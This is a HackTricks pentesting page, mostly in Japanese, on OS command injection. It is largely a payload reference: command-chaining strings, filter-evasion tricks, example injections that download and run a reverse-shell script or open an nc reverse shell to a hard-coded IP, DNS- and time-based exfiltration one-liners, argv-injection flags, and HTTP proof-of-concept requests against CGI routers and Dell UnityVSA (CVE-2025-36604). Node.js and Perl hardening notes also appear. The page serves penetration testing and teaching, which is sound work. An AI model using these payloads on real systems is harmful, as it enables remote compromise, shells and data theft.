# Command Injection

{{#include ../banners/hacktricks-training.md}}

## command Injectionとは何か？

**command injection**は、アプリケーションをホストするserver上でattackerが任意のoperating system commandsを実行できる脆弱性です。その結果、applicationとそのすべてのデータが完全にcompromisedされる可能性があります。これらのcommandsの実行により、通常、attackerはapplicationのenvironmentおよび基盤となるsystemへの不正なaccessまたはcontrolを取得できます。

### コンテキスト

**where your input is being injected**に応じて、commandsの前に**terminate the quoted context**（`"` または `'` を使用）する必要がある場合があります。

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Limition** Bypasses

もし **arbitrary commands inside a linux machine** を実行しようとしているなら、これらの **Bypasses:** を読むと役に立つでしょう。


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **例**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### パラメータ

以下は、code injection や類似の RCE 脆弱性の影響を受ける可能性がある上位25のパラメータです（出典: [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

データの抽出：1文字ずつ
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

`https://github.com/HoLyVieR/dnsbin` にあるツールに基づき、dnsbin.zhack.ca でもホストされています。
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
DNSベースのdata exfiltrationを確認するためのオンラインツール:

- dnsbin.zhack.ca
- pingb.in

### フィルタ回避

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

JavaScript/TypeScriptのバックエンドを監査する際、Node.jsの`child_process` APIに頻繁に遭遇します。
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` は **shell** (`/bin/sh -c`) を起動するため、shell に特別な意味を持つ文字（バッククォート、`;`、`&&`、`|`、`$()`、…）がユーザ入力を文字列に連結した際に **command injection** を引き起こします。

**対策:** `execFile()`（または `spawn()` を `shell` オプションなしで使用）を使い、**各引数を別々の配列要素として渡す**ことで shell を介さないようにします:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
実例: *Synology Photos* ≤ 1.7.0-0794 は、認証不要の WebSocket イベントを介して攻撃者制御のデータが `id_user` に挿入され、その後 `exec()` 呼び出しに埋め込まれて RCE を達成できる脆弱性がありました（Pwn2Own Ireland 2024）。

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

すべての injection が shell metacharacters を必要とするわけではありません。アプリケーションが信頼できない文字列をシステムユーティリティへの引数として渡す場合（`execve`/`execFile` を使っていて shell を介していなくても）、多くのプログラムは先頭が `-` や `--` の引数をオプションとして解析します。これにより攻撃者はシェルを介入させることなくモードを切り替えたり、出力先を変更したり、危険な動作を引き起こしたりできます。

典型的に現れる箇所:

- Embedded web UIs/CGI handlers が `ping <user>`、`tcpdump -i <iface> -w <file>`、`curl <url>` のようなコマンドを組み立てる場合
- Centralized CGI routers（例: `/cgi-bin/<something>.cgi` といったセレクタパラメータ `topicurl=<handler>`）で、複数のハンドラが同じ弱いバリデータを再利用している場合

試すべきこと:

- 下流のツールにフラグとして消費されるよう、`-`/`--` で始まる値を提供する
- 振る舞いを変えたりファイルを書き出したりするフラグを悪用する。例えば:
  - `ping`: `-f`/`-c 100000` でデバイスに負荷をかける（DoS）
  - `curl`: `-o /tmp/x` で任意パスに書き込む、`-K <url>` で攻撃者制御の設定を読み込む
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` で unsafe なラッパーにおけるポストローテート実行を狙う
- プログラムが `--` の end-of-options をサポートしている場合、間違った位置に `--` を前置するような安易な緩和策を回避できるか試す

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Brute-Force Detection List


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Perl backticks/qx// sinks in Apache mod_perl handlers (到達可能性と悪用)

Real-world pattern: Perl code builds a shell command string and executes it via backticks (or qx//). In a mod_perl AccessHandler, attacker-controlled request components like $r->uri() can flow into that string. If any branch concatenates raw input and then evaluates it with a shell, you get pre-auth RCE.

Risky Perl execution primitives (spawn a shell when given a single string):
- Backticks / qx//: my $out = `cmd ...`;
- system with a single string: system("/bin/sh -c '...'") は暗黙的にシェルを起動する
- open with a pipe: open my $fh, "cmd |" or "| cmd"
- IPC::Open3 with a single string

Minimal vulnerable shape observed in the wild:
```perl
sub getCASURL {
...
my $exec_cmd = "...";
if ($type eq 'login') {
$exec_cmd .= $uri;        # $uri from $r->uri() → attacker-controlled
my $out = `$exec_cmd`;    # backticks = shell
}
}
```
mod_perl における到達性に関する重要な考慮点:
- Handler registration: httpd.conf がリクエストをあなたの Perl モジュールにルーティングする必要がある。例えば PerlModule MOD_SEC_EMC::AccessHandler や、パススコープに対して AccessHandler::handler を呼び出す設定など。
- Triggering the vulnerable branch: 未認証の login フローを強制して type == "login" にする（例: 期待される auth cookie を省略する）。
- Resolvable path: リクエストが設定済みスコープ内で解決される URI をターゲットにしていることを確認する。Apache がリクエストを handler 経由でまったくルーティングしない場合、sink には到達しない。

Exploitation workflow
1) httpd.conf を調べ、PerlModule/MOD_PERL の handler スコープを確認して、handler によって処理される解決可能なパスを見つける。
2) 未認証リクエストを送信して login リダイレクトパスが選ばれるようにする (type == "login")。
3) request-URI のパスに shell metacharacters を入れ、$r->uri() がペイロードをコマンド文字列に運ぶようにする。

Example HTTP PoC (path injection via ';')
```http
GET /ui/health;id HTTP/1.1
Host: target
Connection: close
```
Tips
- 区切り文字を試す: ;, &&, |, `backticks`, $(...), および引用方法に応じてエンコードされた改行 (%0A)。
- 以前のパッチが別の引数には引用を追加しているが、ある分岐でURIを引用していない場合、文字列の末尾にペイロードを追加すると動くことが多い: ;id# または &&/usr/bin/id#

Hardening (Perl)
- シェル文字列を構築しない。引数ベクトルでの実行を優先: system('/usr/bin/curl', '--silent', '--', $safe_url) — シェルを使わない。
- シェルが避けられない場合は、すべての分岐で厳密かつ一貫してエスケープすること；$r->uri() を敵対的入力として扱う。パス/クエリには URI::Escape と厳格なホワイトリストを検討する。
- コマンド実行に backticks/qx// を使わない。どうしても必要ならシェルを呼び出さずに open3/list 形式で出力を取得する。
- mod_perl ハンドラでは、auth/redirect のコードパスにコマンド実行を含めないか、すべての分岐で同一のサニタイズを行って「ほかは直したが 1 つの分岐だけ直していない」ような回帰を避ける。

Vulnerability hunting
- シェルコマンドを組み立てるモジュールのパッチ差分を確認する。分岐間で引用が不一致になっていないか探す（例: if ($type eq 'login') がエスケープされていない等）。
- backticks, qx//, open\s*\(|\||, and system\s*\(\s* を grep して文字列ベースのシェルを見つける。シンクからリクエスト入力 ($r) までのコールグラフを構築して、認証前に到達可能か確認する。

Real-world case: Dell UnityVSA pre-auth RCE (CVE-2025-36604)
- Pre-auth command injection via backticks in AccessTool.pm:getCASURL when type == "login" concatenated raw $uri ($r->uri()).
- Reachable through MOD_SEC_EMC::AccessHandler → make_return_address($r) → getCASLoginURL(..., type="login") → getCASURL(..., $uri, 'login').
- Practical nuance: use a resolvable path covered by the handler; otherwise the module won’t execute and the sink won’t be hit.

## References

- [It’s Never Simple Until It Is: Dell UnityVSA Pre‑Auth Command Injection (CVE‑2025‑36604)](https://labs.watchtowr.com/its-never-simple-until-it-is-dell-unityvsa-pre-auth-command-injection-cve-2025-36604/)
- [Dell PSIRT DSA‑2025‑281 – Security update for Dell Unity/UnityVSA/Unity XT](https://www.dell.com/support/kbdoc/en-uk/000350756/dsa-2025-281-security-update-for-dell-unity-dell-unityvsa-and-dell-unity-xt-security-update-for-multiple-vulnerabilities)
- [watchTowr Detection Artefact Generator – Dell UnityVSA Pre‑Auth CVE‑2025‑36604](https://github.com/watchtowrlabs/watchTowr-vs-Dell-UnityVSA-PreAuth-CVE-2025-36604)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
